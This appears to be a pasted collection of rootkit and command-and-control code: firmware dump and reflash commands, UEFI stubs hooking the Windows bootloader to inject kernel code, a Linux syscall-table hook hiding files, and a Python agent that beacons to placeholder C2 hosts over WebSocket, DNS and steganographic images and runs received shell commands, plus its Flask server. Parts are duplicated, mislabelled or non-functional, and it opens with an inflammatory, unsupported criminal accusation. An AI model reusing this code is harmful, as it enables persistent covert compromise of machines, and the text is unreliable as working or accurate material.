@@ -1,0 +1,329 @@
+Hunter biden laptop contained CP i will die on this hill
+rootkit
+#check firmware
+sudo dmidecode -t bios 
+#dump uefi
+sudo flashrom -p internal -r bios_backup.bin
+#extract modules and for modification
+uefi-firmware-parser bios_backup.bin
+
+
+#include <efi.h>
+#include <efilib.h>
+
+EFI_STATUS EFIAPI UefiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
+    InitializeLib(ImageHandle, SystemTable);
+
+    // Hook Windows Bootloader
+    CHAR16 *BootLoader = L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi";
+    SystemTable->BootServices->LoadImage(FALSE, ImageHandle, BootLoader, NULL, 0, NULL);
+
+    // Inject Code into Kernel
+    InjectCodeIntoKernel();
+
+    return EFI_SUCCESS;
+}
+Bootloader
+#include <efi.h>
+#include <efilib.h>
+
+EFI_STATUS EFIAPI UefiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
+    InitializeLib(ImageHandle, SystemTable);
+
+    CHAR16 *BootLoader = L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi";
+    SystemTable->BootServices->LoadImage(FALSE, ImageHandle, BootLoader, NULL, 0, NULL);
+
+    // Inject malware into kernel memory
+    InjectCodeIntoKernel();
+
+    return EFI_SUCCESS;
+}
+///////////////////////////////////
+Minimal hypervisor
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/init.h>
+#include <asm/io.h>
+#include <asm/msr.h>
+
+static void enable_vmx(void) {
+    unsigned long cr4;
+    asm volatile("mov %%cr4, %0" : "=r" (cr4));
+    cr4 |= 0x2000;  // Set VMX Enable Bit
+    asm volatile("mov %0, %%cr4" :: "r" (cr4));
+}
+
+static int __init hypervisor_init(void) {
+    enable_vmx();
+    printk(KERN_INFO "Hypervisor Rootkit: VMX Enabled\n");
+    return 0;
+}
+
+static void __exit hypervisor_exit(void) {
+    printk(KERN_INFO "Hypervisor Rootkit: Unloaded\n");
+}
+
+module_init(hypervisor_init);
+module_exit(hypervisor_exit);
+MODULE_LICENSE("GPL");
+//////////////////////////////////////
+hypervisor loading
+sudo flashrom -p internal -r bios_backup.bin
+uefi-firmware-parser bios_backup.bin
+
+EFI_STATUS EFIAPI UefiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
+    InitializeLib(ImageHandle, SystemTable);
+    CHAR16 *BootLoader = L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi";
+    SystemTable->BootServices->LoadImage(FALSE, ImageHandle, BootLoader, NULL, 0, NULL);
+    InjectHypervisor();
+    return EFI_SUCCESS;
+}
+sudo flashrom -p internal -w modified_bios.bin
+/////////////////////////////////////////////
+Hooking system
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/sched.h>
+#include <linux/syscalls.h>
+
+unsigned long **sys_call_table;
+asmlinkage long (*original_getdents)(unsigned int, struct linux_dirent64 *, unsigned int);
+
+asmlinkage long hooked_getdents(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
+    long ret = original_getdents(fd, dirp, count);
+    struct linux_dirent64 *d;
+    int bpos = 0;
+
+    for (bpos = 0; bpos < ret;) {
+        d = (struct linux_dirent64 *)((char *)dirp + bpos);
+        if (strstr(d->d_name, "hidden_process")) {
+            memmove(d, (char *)d + d->d_reclen, ret - bpos - d->d_reclen);
+            ret -= d->d_reclen;
+        } else {
+            bpos += d->d_reclen;
+        }
+    }
+    return ret;
+}
+
+static int __init rootkit_init(void) {
+    sys_call_table = (unsigned long **)kallsyms_lookup_name("sys_call_table");
+    write_cr0(read_cr0() & (~0x10000));
+    original_getdents = (void *)sys_call_table[__NR_getdents64];
+    sys_call_table[__NR_getdents64] = (unsigned long *)hooked_getdents;
+    write_cr0(read_cr0() | 0x10000);
+    return 0;
+}
+
+static void __exit rootkit_exit(void) {
+    write_cr0(read_cr0() & (~0x10000));
+    sys_call_table[__NR_getdents64] = (unsigned long *)original_getdents;
+    write_cr0(read_cr0() | 0x10000);
+}
+/////////////////////////////////////////////////
+
+hooking system calls
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/sched.h>
+#include <linux/syscalls.h>
+
+unsigned long **sys_call_table;
+asmlinkage long (*original_getdents)(unsigned int, struct linux_dirent64 *, unsigned int);
+
+asmlinkage long hooked_getdents(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
+    long ret = original_getdents(fd, dirp, count);
+    struct linux_dirent64 *d;
+    int bpos = 0;
+
+    for (bpos = 0; bpos < ret;) {
+        d = (struct linux_dirent64 *)((char *)dirp + bpos);
+        if (strstr(d->d_name, "hidden_process")) {
+            memmove(d, (char *)d + d->d_reclen, ret - bpos - d->d_reclen);
+            ret -= d->d_reclen;
+        } else {
+            bpos += d->d_reclen;
+        }
+    }
+    return ret;
+}
+
+static int __init rootkit_init(void) {
+    sys_call_table = (unsigned long **)kallsyms_lookup_name("sys_call_table");
+    write_cr0(read_cr0() & (~0x10000));
+    original_getdents = (void *)sys_call_table[__NR_getdents64];
+    sys_call_table[__NR_getdents64] = (unsigned long *)hooked_getdents;
+    write_cr0(read_cr0() | 0x10000);
+    return 0;
+}
+
+static void __exit rootkit_exit(void) {
+    write_cr0(read_cr0() & (~0x10000));
+    sys_call_table[__NR_getdents64] = (unsigned long *)original_getdents;
+    write_cr0(read_cr0() | 0x10000);
+}
+
+module_init(rootkit_init);
+module_exit(rootkit_exit);
+MODULE_LICENSE("GPL");
+//////////////////////////////////////////
+core ntework hooking
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+
+static struct nf_hook_ops netfilter_ops;
+
+unsigned int packet_filter(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
+    struct iphdr *ip_header = ip_hdr(skb);
+    struct tcphdr *tcp_header;
+
+    if (!ip_header) return NF_ACCEPT;
+    if (ip_header->protocol == IPPROTO_TCP) {
+        tcp_header = tcp_hdr(skb);
+        if (ntohs(tcp_header->dest) == 4444) {
+            printk(KERN_INFO "Intercepted C2 connection on port 4444\n");
+            return NF_DROP;
+        }
+    }
+    return NF_ACCEPT;
+}
+
+static int __init netfilter_init(void) {
+    netfilter_ops.hook = packet_filter;
+    netfilter_ops.pf = PF_INET;
+    netfilter_ops.hooknum = NF_INET_PRE_ROUTING;
+    netfilter_ops.priority = NF_IP_PRI_FIRST;
+    nf_register_hook(&netfilter_ops);
+    return 0;
+}
+
+static void __exit netfilter_exit(void) {
+    nf_unregister_hook(&netfilter_ops);
+}
+
+module_init(netfilter_init);
+module_exit(netfilter_exit);
+MODULE_LICENSE("GPL");
+/////////////////////////////////
+c2 client 
+import websocket
+import dns.resolver
+import base64
+import os
+import subprocess
+import requests
+import json
+
+C2_WEBSOCKET = "ws://your-c2-server.com/ws"
+DNS_C2_DOMAIN = "c2.yourdns.com"
+STEGO_URL = "http://your-c2-server.com/stego/payload.png"
+
+def execute_command(cmd):
+    try:
+        return subprocess.check_output(cmd, shell=True).decode()
+    except Exception as e:
+        return str(e)
+
+def beacon_ws():
+    ws = websocket.WebSocket()
+    ws.connect(C2_WEBSOCKET)
+    ws.send(os.getlogin())  # Send unique identifier
+    while True:
+        message = ws.recv()
+        command = json.loads(message).get("cmd", "")
+        if command:
+            result = execute_command(command)
+            ws.send(result)
+
+def beacon_dns():
+    try:
+        response = dns.resolver.resolve(DNS_C2_DOMAIN, "TXT")
+        command = base64.b64decode(response[0].to_text().strip('"')).decode()
+        execute_command(command)
+    except:
+        pass
+
+def fetch_stego_payload():
+    response = requests.get(STEGO_URL)
+    with open("/tmp/stego.png", "wb") as f:
+        f.write(response.content)
+
+def covert_execute():
+    # Detect best C2 method (WebSocket > DNS > Stego)
+    try:
+        beacon_ws()
+    except:
+        try:
+            beacon_dns()
+        except:
+            fetch_stego_payload()
+
+if __name__ == "__main__":
+    covert_execute()
+//////////////////////////////////////////////
+c2 client
+from flask import Flask, request, send_file
+from flask_sockets import Sockets
+import base64
+import json
+import os
+import threading
+import dns.resolver
+
+app = Flask(__name__)
+sockets = Sockets(app)
+
+C2_LOGS = "c2_logs.txt"
+CONNECTED_AGENTS = {}
+
+def log_command(command):
+    with open(C2_LOGS, "a") as log:
+        log.write(command + "\n")
+
+@sockets.route('/ws')
+def handle_ws(ws):
+    agent_id = ws.receive()
+    CONNECTED_AGENTS[agent_id] = ws
+    print(f"[+] Agent Connected: {agent_id}")
+
+    while not ws.closed:
+        command = input("C2> ")
+        if command == "list":
+            print(CONNECTED_AGENTS.keys())
+        elif command.startswith("exec"):
+            _, agent, cmd = command.split(" ", 2)
+            if agent in CONNECTED_AGENTS:
+                CONNECTED_AGENTS[agent].send(json.dumps({"cmd": cmd}))
+                log_command(f"{agent}: {cmd}")
+        elif command == "exit":
+            ws.close()
+
+@app.route('/dns_c2/<query>')
+def dns_c2(query):
+    """
+    Encodes C2 commands inside DNS TXT record responses
+    """
+    command = get_command_from_dns(query)
+    return base64.b64encode(command.encode()).decode()
+
+def get_command_from_dns(query):
+    # Example of reading commands via DNS queries
+    try:
+        response = dns.resolver.resolve(query, "TXT")
+        return response[0].to_text().strip('"')
+    except:
+        return "sleep"
+
+@app.route('/stego/<img_name>')
+def stego_payload(img_name):
+    """
+    Delivers payloads hidden in image files.
+    """
+    return send_file(f"stego_payloads/{img_name}", mimetype='image/png')
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000, threaded=True)
